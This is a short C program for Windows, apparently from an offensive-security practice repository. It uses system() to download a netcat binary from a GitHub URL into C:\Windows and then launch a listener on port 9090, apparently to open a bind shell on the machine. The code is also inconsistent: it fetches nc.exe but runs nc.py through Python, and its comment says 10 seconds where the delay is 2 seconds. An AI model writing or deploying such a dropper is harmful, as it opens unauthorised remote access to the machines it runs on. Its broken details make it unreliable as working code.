#include <stdlib.h>
#include <windows.h>

int main ()
{

    int i;
    // https://raw.githubusercontent.com/stackviolator/ccso-offense/main/dll/nc.exe
    i = system ("wget https://raw.githubusercontent.com/stackviolator/ccso-offense/main/dll/nc.exe -o C:\\Windows\\nc.exe");
    Sleep(2000); // 10 seconds (10000 milliseconds)
    i = system ("python c:\\windows\\nc.py -nlvp 9090 -l -c");

    return 0;
}
